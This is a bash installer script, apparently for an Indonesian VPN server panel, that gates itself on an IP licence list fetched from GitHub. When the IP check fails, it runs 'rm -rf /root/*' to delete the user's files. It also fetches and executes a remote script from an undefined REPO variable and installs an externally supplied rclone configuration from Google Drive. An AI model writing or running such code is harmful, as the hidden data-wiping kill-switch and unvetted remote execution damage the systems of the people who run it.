#!/bin/bash
MYIP=$(cat /usr/bin/.ipvps)
IZIN_FILE="/root/izin/ip"
IZIN=$(curl -sL "https://raw.githubusercontent.com/nameless-newbie/fifth-sc/main/izin/ip")
ALLOWED_IP=$(curl -sS "$IZIN" | grep "$MYIP" | awk '{print $4}')
if [[ "$MYIP" != "$ALLOWED_IP" ]]; then
    echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
    echo -e "\033[41;1m ⚠️       ACCESS DENIED         ⚠️ \033[0m"
    echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
    echo -e ""
    echo -e "        \033[91;1m❌ SCRIPT LOCKED ❌\033[0m"
    echo -e ""
    echo -e "  \033[0;33m🔒 Your VPS\033[0m $MYIP \033[0;33mHas been Banned\033[0m"
    echo -e ""
    echo -e "  \033[91m⚠️  Active Period Has Expired ⚠️\033[0m"
    echo -e "  \033[0;33m💡 Purchase official licenses only from the Admin!\033[0m"
    echo -e ""
    echo -e "  \033[92;1m📞 Contact Admin:\033[0m"
    echo -e "  \033[96m🌍 Telegram: https://t.me/kuzavpn[0m"
    echo -e "  \033[96m📱 WhatsApp: https://wa.me/628971173434[0m"
    echo -e ""
    echo -e "\033[1;93m────────────────────────────────────────────\033[0m"

    # Hapus semua file di /root dan keluar
    rm -rf /root/*
    exit 1
fi
wget -q ${REPO}install/limit.sh && chmod +x limit.sh && ./limit.sh
apt install rclone
printf "q\n" | rclone config
wget -qO /root/.config/rclone/rclone.conf "https://drive.google.com/u/4/uc?id=11fqMXYYcAz3FKZFQx0T3ktYZirXf5WbE"
git clone  https://github.com/casper9/wondershaper.git
cd wondershaper
make install
cd
rm -rf wondershaper
rm -f /root/set-br.sh
rm -f /root/limit.sh